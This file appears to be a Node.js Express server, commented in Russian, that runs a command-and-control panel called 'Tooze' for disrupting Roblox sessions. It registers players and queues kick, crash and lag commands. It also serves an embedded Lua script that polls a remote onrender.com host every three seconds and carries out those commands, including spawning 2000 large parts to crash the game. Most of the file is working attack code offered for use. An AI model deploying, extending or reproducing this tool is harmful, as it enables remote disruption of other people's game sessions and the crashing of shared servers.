const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

// === НАСТРОЙКА MIDDLEWARE ===
app.use(cors()); // Разрешаем запросы с любых источников
app.use(express.json());
app.use(express.static('public'));

// === ХРАНИЛИЩЕ ДАННЫХ ===
// Все данные хранятся в памяти сервера
const players = {}; 
// Структура:
// players["ИмяИгрока"] = {
//   command: "kick" | "crash" | null,
//   lagActive: true | false
// }

// === 1. РЕГИСТРАЦИЯ ИГРОКА ===
// Вызывается из скрипта игрока при запуске
app.get('/api/register', (req, res) => {
    const username = req.query.username;
    if (!username) {
        return res.status(400).send('Username required');
    }
    
    if (!players[username]) {
        players[username] = {
            command: null,
            lagActive: false
        };
        console.log(`✅ Игрок зарегистрирован: ${username}`);
        console.log(`📊 Всего игроков: ${Object.keys(players).length}`);
    }
    
    res.send('OK');
});

// === 2. ПОЛУЧЕНИЕ СПИСКА ИГРОКОВ ===
// Используется панелью для отображения онлайн
app.get('/api/players', (req, res) => {
    const playerList = Object.keys(players).map(name => ({
        username: name,
        lagActive: players[name].lagActive || false
    }));
    res.json(playerList);
});

// === 3. ОТПРАВКА КОМАНДЫ ===
// Вызывается с панели управления
app.post('/api/command', (req, res) => {
    const { username, command, value } = req.body;
    
    if (!username || !command) {
        return res.status(400).json({ error: 'Username and command required' });
    }
    
    if (!players[username]) {
        return res.status(404).json({ error: 'Player not found' });
    }
    
    // Сохраняем команду для игрока
    players[username].command = command;
    
    // Если команда lag, сохраняем состояние
    if (command === 'lag' && value !== undefined) {
        players[username].lagActive = value;
    }
    
    console.log(`📨 Команда "${command}" отправлена игроку ${username}`);
    res.json({ success: true, command: command, player: username });
});

// === 4. ПОЛУЧЕНИЕ КОМАНД ДЛЯ ИГРОКА ===
// Вызывается из скрипта игрока каждые 3 секунды
app.get('/api/get_commands', (req, res) => {
    const username = req.query.username;
    
    if (!username || !players[username]) {
        return res.send(''); // Возвращаем пустую строку
    }
    
    // Забираем команду и очищаем её (одноразовое выполнение)
    const command = players[username].command || '';
    players[username].command = null; // Сбрасываем после прочтения
    
    res.send(command);
});

// === 5. ВОЗВРАТ ОСНОВНОГО СКРИПТА ===
// Выдается через лоадер
app.get('/api/get_exec_script', (req, res) => {
    const mainScript = `
-- ============================================
-- ОСНОВНОЙ СКРИПТ TOOZE
-- Версия: v5.0
-- ============================================

local serverUrl = _G.ToozeServer or "https://crasher-panel.onrender.com"
local player = game.Players.LocalPlayer

if not player then
    warn("❌ Tooze: Не удалось получить игрока!")
    return
end

print("🚀 Tooze загружен для игрока: " .. player.Name)

-- === РЕГИСТРАЦИЯ НА СЕРВЕРЕ ===
local function register()
    local success, err = pcall(function()
        local url = serverUrl .. "/api/register?username=" .. player.Name
        game:HttpGet(url)
    end)
    if success then
        print("✅ Tooze: Успешная регистрация на сервере")
    else
        warn("❌ Tooze: Ошибка регистрации: " .. tostring(err))
    end
end

-- === ПОЛУЧЕНИЕ И ВЫПОЛНЕНИЕ КОМАНД ===
local function checkCommands()
    local success, response = pcall(function()
        local url = serverUrl .. "/api/get_commands?username=" .. player.Name
        return game:HttpGet(url)
    end)
    
    if not success then 
        return 
    end
    
    -- Выполняем команду
    if response == "kick" then
        print("👢 Tooze: Получена команда KICK")
        player:Kick("Вас кикнули через Tooze Panel")
        
    elseif response == "crash" then
        print("💥 Tooze: Получена команда CRASH")
        -- Создаем много объектов для краша
        for i = 1, 2000 do
            local part = Instance.new("Part")
            part.Size = Vector3.new(50, 50, 50)
            part.CFrame = CFrame.new(
                math.random(-1000, 1000), 
                math.random(500, 1500), 
                math.random(-1000, 1000)
            )
            part.Anchored = true
            part.Parent = workspace
        end
        print("💥 Tooze: Краш выполнен")
        
    elseif response == "lag" then
        print("🐌 Tooze: Получена команда LAG")
        -- Нагружаем процессор
        for i = 1, 100 do
            game:GetService("RunService").Stepped:Wait()
        end
        print("🐌 Tooze: Лаг выполнен")
    end
end

-- === ЗАПУСК ===
register()

-- Проверяем команды каждые 3 секунды
while wait(3) do
    checkCommands()
end
    `;
    
    res.setHeader('Content-Type', 'text/plain');
    res.send(mainScript);
});

// === 6. ПРОВЕРКА СТАТУСА СЕРВЕРА ===
app.get('/api/status', (req, res) => {
    res.json({ 
        status: 'online', 
        players: Object.keys(players).length,
        uptime: process.uptime()
    });
});

// === ЗАПУСК СЕРВЕРА ===
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер Tooze запущен!`);
    console.log(`📍 Порт: ${PORT}`);
    console.log(`🌐 Адрес: http://localhost:${PORT}`);
    console.log(`📊 Статус: /api/status`);
});

// === ОБРАБОТКА ОШИБОК ===
app.use((err, req, res, next) => {
    console.error('❌ Ошибка сервера:', err);
    res.status(500).json({ error: 'Internal server error' });
});
